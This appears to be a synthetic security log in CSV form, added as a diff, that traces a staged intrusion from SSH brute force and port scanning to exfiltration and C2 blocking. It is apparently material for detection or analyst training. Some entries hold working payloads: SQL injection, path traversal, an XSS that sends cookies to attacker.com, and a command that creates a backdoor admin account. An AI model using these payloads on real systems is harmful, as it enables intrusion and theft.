@@ -1,0 +1,34 @@
+Timestamp,Component,PID,Status_Severity,Log_Message
+2026-06-18T20:00:01Z,system_kernel,412,INFO,Baseline systems optimized. NTP time synchronization verified with stratum-2 server.
+2026-06-18T20:05:12Z,cloud_firewall,8812,ALLOW,src_ip=10.100.5.22 dest_ip=8.8.8.8 dest_port=53 proto=UDP service=DNS bytes_sent=94 rule_id=GLOBAL_DNS_OUT
+2026-06-18T20:14:20Z,network_edge_fw,8812,DENY,src_ip=198.51.100.77 dest_ip=10.100.2.15 dest_port=3306 proto=TCP action=BLOCK rule_id=DMZ_INGRESS_PROTECT
+2026-06-18T21:40:01Z,perimeter_sshd,9411,FAILURE,"src_ip=185.220.101.5 user=root port=51022 auth_method=password msg=""Permission denied"""
+2026-06-18T21:40:04Z,perimeter_sshd,9411,FAILURE,"src_ip=185.220.101.5 user=root port=51028 auth_method=password msg=""Permission denied"""
+2026-06-18T21:40:07Z,perimeter_sshd,9411,FAILURE,"src_ip=185.220.101.5 user=admin port=51034 auth_method=password msg=""Permission denied"""
+2026-06-18T21:40:10Z,perimeter_sshd,9411,FAILURE,"src_ip=185.220.101.5 user=administrator port=51040 auth_method=password msg=""Permission denied"""
+2026-06-18T21:40:13Z,perimeter_sshd,9411,FAILURE,"src_ip=185.220.101.5 user=backup port=51046 auth_method=password msg=""Permission denied"""
+2026-06-18T21:40:16Z,perimeter_sshd,9411,FAILURE,"src_ip=185.220.101.5 user=postgres port=51052 auth_method=password msg=""Permission denied"""
+2026-06-18T21:40:19Z,perimeter_sshd,9411,FAILURE,"src_ip=185.220.101.5 user=testport port=51058 auth_method=password msg=""Permission denied"""
+2026-06-18T21:40:22Z,perimeter_sshd,9411,FAILURE,"src_ip=185.220.101.5 user=service port=51064 auth_method=password msg=""Permission denied"""
+2026-06-18T21:45:30Z,nginx_access,1022,SUCCESS,"src_ip=10.100.5.15 status=200 method=GET uri=""/api/v1/telemetry"" bytes=4120 agent=""Mozilla/5.0"""
+2026-06-18T21:48:12Z,internal_fw,8813,DROP,src_ip=10.100.5.99 dest_ip=10.100.5.1 dest_port=21 proto=TCP action=DROP rule_id=VLAN_ISOLATION_DEFAULT
+2026-06-18T21:48:13Z,internal_fw,8813,DROP,src_ip=10.100.5.99 dest_ip=10.100.5.1 dest_port=22 proto=TCP action=DROP rule_id=VLAN_ISOLATION_DEFAULT
+2026-06-18T21:48:14Z,internal_fw,8813,DROP,src_ip=10.100.5.99 dest_ip=10.100.5.1 dest_port=23 proto=TCP action=DROP rule_id=VLAN_ISOLATION_DEFAULT
+2026-06-18T21:48:15Z,internal_fw,8813,DROP,src_ip=10.100.5.99 dest_ip=10.100.5.1 dest_port=25 proto=TCP action=DROP rule_id=VLAN_ISOLATION_DEFAULT
+2026-06-18T21:48:16Z,internal_fw,8813,DROP,src_ip=10.100.5.99 dest_ip=10.100.5.1 dest_port=80 proto=TCP action=DROP rule_id=VLAN_ISOLATION_DEFAULT
+2026-06-18T21:48:17Z,internal_fw,8813,DROP,src_ip=10.100.5.99 dest_ip=10.100.5.1 dest_port=110 proto=TCP action=DROP rule_id=VLAN_ISOLATION_DEFAULT
+2026-06-18T21:48:18Z,internal_fw,8813,DROP,src_ip=10.100.5.99 dest_ip=10.100.5.1 dest_port=443 proto=TCP action=DROP rule_id=VLAN_ISOLATION_DEFAULT
+2026-06-18T21:48:19Z,internal_fw,8813,DROP,src_ip=10.100.5.99 dest_ip=10.100.5.1 dest_port=445 proto=TCP action=DROP rule_id=VLAN_ISOLATION_DEFAULT
+2026-06-18T21:48:20Z,internal_fw,8813,DROP,src_ip=10.100.5.99 dest_ip=10.100.5.1 dest_port=1433 proto=TCP action=DROP rule_id=VLAN_ISOLATION_DEFAULT
+2026-06-18T21:48:21Z,internal_fw,8813,DROP,src_ip=10.100.5.99 dest_ip=10.100.5.1 dest_port=3389 proto=TCP action=DROP rule_id=VLAN_ISOLATION_DEFAULT
+2026-06-18T22:01:10Z,nginx_access,1022,EXPLOIT,"src_ip=198.51.100.12 status=500 method=GET uri=""/public/catalog.php?id=99%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20password%20FROM%20users%20LIMIT%201),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)"" bytes=820 signature=""SQL_INJECTION_ERROR_BASED"""
+2026-06-18T22:02:33Z,nginx_access,1022,EXPLOIT,"src_ip=198.51.100.12 status=403 method=GET uri=""/v2/download.py?file=../../../../../../../../etc/passwd%00"" bytes=154 signature=""DIRECTORY_TRAVERSAL_NULL_BYTE"""
+2026-06-18T22:04:15Z,nginx_access,1022,EXPLOIT,"src_ip=198.51.100.12 status=200 method=POST uri=""/discussion/post.php"" payload=""<script>document.write('<img src=""http://attacker.com/collect?cookie='+escape(document.cookie)+'"" />')</script>"" signature=""STORED_XSS_INJECTION"""
+2026-06-18T22:06:50Z,nginx_access,1022,EXPLOIT,"src_ip=198.51.100.12 status=500 method=POST uri=""/upload/profile_avatar.php"" payload=""hex_stream_0x4d5a90000300000004000000ffff0000b80000000000000040"" signature=""MALICIOUS_REVERSE_SHELL_UPLOAD"""
+2026-06-18T22:10:05Z,windows_event_log,4624,SUCCESS,"user=""sz_analyst"" domain=""ENTERPRISE_AD"" src_ip=10.100.5.15 authentication_type=""Kerberos"" logon_id=0x3F4A12"
+2026-06-18T22:12:33Z,sysmon_process,1,EXECUTION,"pid=4912 user=""SYSTEM"" image=""C:\Windows\System32\cmd.exe"" parent=""nginx.exe"" command=""cmd.exe /c whoami && net user admin_backdoor Pass123! /add && net localgroup administrators admin_backdoor /add"" hash_sha256=A34F90B122C3410E45F3D11A0D"
+2026-06-18T22:15:00Z,app_audit,712,DATA_EXFIL,"src_ip=10.100.5.15 status=SUCCESS method=SFTP msg=""Data payload synchronization routing initiated."" target_file=""/opt/secure/database_cluster_dump.sql.gz"" dest_node=203.0.113.89 total_bytes=8450000000 encryption=None"
+2026-06-18T22:18:22Z,central_active_directory,512,WARNING,Account lookup anomaly detected. Account 'admin_backdoor' created outside standard Identity Identity provisioning workflow.
+2026-06-18T22:20:11Z,network_edge_fw,8812,DENY,"src_ip=10.100.5.99 dest_ip=185.220.101.5 dest_port=4444 proto=TCP action=BLOCK rule_id=OUTBOUND_C2_BLOCK msg=""Command and Control beaconing pattern blocked."""
+2026-06-18T22:30:15Z,cloud_storage_api,204,AUDIT,"user=""app-service-account"" service=""S3Bucket"" operation=""PutBucketPolicy"" msg=""Anomalous public access configuration modifier applied to bucket 'financial-records-2026'."" status=SUCCESS"
+2026-06-18T22:45:00Z,system_kernel,412,CRITICAL,High memory utilization constraint observed on cluster node database-01. Swap space allocation running at 94% ceiling.
